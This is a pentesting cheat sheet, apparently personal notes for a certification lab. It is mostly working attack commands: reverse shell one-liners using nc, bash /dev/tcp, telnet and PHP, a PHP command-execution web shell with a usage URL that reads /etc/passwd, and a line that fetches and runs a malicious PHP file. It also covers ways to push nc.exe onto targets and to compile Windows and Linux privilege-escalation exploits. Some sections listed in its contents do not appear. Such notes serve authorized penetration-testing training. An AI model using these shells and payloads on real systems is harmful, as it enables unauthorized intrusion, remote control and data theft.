# Pentest-note


## Contents

- [Shell](#shell)
    - [Reverse Shell](#reverse-shell)
    - [Bind Shell](#bind-shell)
    - [Web Shell](#web-shell)

- [File transfer](#file-transfer)
    - [Ftp](#ftp)
    - [Tftp](#tftp)    
    - [nc](#nc)
    - [SMB](#smb)
    - [curl](#curl)
    - [http](#http)

- [Enable commands](#enable-commands)
    - [Windows commands](#windows)
    - [Linux commands](#linux)    

- [Build exploits](#build-exploits)
    - [Compile for Windows](#compile-for-windows)
    - [Compile for Linux](#compile-for-linux)    


- [Common exploits](#common-exploits)


- [Command snippets](#command-snippets)


## Shell

#### Reverse Shell

Windows :

```bash
nc IP PORT -e cmd.exe
```

Listener:

```bash
nc -nlvp PORT
```

Linux :

```bash
bash -i >& /dev/tcp/10.11.0.0/31337 0>&1
```

```bash
nc -e /bin/sh 10.11.0.0 31337
```

Telnet reverse shell:

```bash
telnet 10.11.0.xxx 31337 | /bin/bash | telnet 10.11.0.xxx 31338
```

```bash
rm -f /tmp/p; mknod /tmp/p p && telnet 10.11.0.xxx 31337 0/tmp/p
```

Php reverse shell:

```php
<?php echo shell_exec ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacking IP port >/tmp/f');?>

Usage:

<?php echo shell_exec ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.xx 80 >/tmp/f');?>

```

```php
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```php
wget -O /tmp/bd.php <url_to_malicious_file> && php -f /tmp/bd.php
```

More: 

http://pentestmonkey.net/tools/web-shells/php-reverse-shell

http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

https://gist.github.com/sckalath/67a59eb4955f1f9aedde

https://gist.github.com/sckalath/89590ef81557f3a87ef0

#### Bind Shell

```bash
nc IP PORT

nc -nlvp PORT  -e cmd.exe
```

```python
python -c 'import pty; pty.spawn("/bin/sh")'
```

for some case, sh is better than bash 



#### Web Shell

One line php webshell (windows and linux ok) :

```php
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>

Usage:
http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd

```

## File transfer

#### Ftp

```bash
echo open 10.11.0.xxx 21> ftp.txt
echo USER offsec>> ftp.txt
echo ftp>> ftp.txt
echo bin >> ftp.txt
echo GET nc.exe >> ftp.txt
echo bye >> ftp.txt
ftp -v -n -s:ftp.txt
```

#### Tftp

```bash
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /usr/share/windows-binaries/nc.exe /tftp/
tftp -i 10.11.0.5 get nc.exe
```

#### nc

```bash
Sender nc -nlvp PORT  -w $(time to kill after file transfered) < text file
Receiver: nc ip port >file
```

#### SMB

```
Server: /usr/share/doc/python-impacket/examples# python smbserver.py PPP /root/Desktop/oscp/working/5/MS17-010/

Receiver: copy \\10.11.0.xxx\PPP\1.exe C:\
```

#### curl

if put is enabled to the server

```bash
curl -v -X PUT -T 2.txt 10.11.1.xxx/2.txt
```

Another tools

```bash
cadaver http://10.11.1.xxx 
```

#### http

Hosting the server but this will prevent local execution of php code

```bash
python -m SimpleHTTPServer 80
```


## Build exploits

#### Compile for Windows

```bash
ubuntu:
64 bit
sudo apt-get update
sudo apt-get install mingw-w64

usage : i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32 for 32bit , remove -lws2_32 for 64bit
```

#### Compile for Linux

```
ubuntu:
sudo apt-get install libc6-dev-i386 


centos:
yum install glibc-devel 
yum install glibc-devel.i686
yum install glibc-devel.i686 libgcc.i686 libstdc++-devel.i686 ncurses-devel.i686
yum install glibc-static


usage:
gcc -m32 -o exp exp.c -static 
gcc -m64 -o exp exp.c -static 


```

#### Command snippets

Cat on Windows:

```
C:\>type c.txt 
```

Search file on Windows:

```
dir /b/s *.txt
```

Linux PE
https://gist.github.com/sckalath/8b8fe29ee5489eaefda1

https://www.rebootuser.com/?p=1623
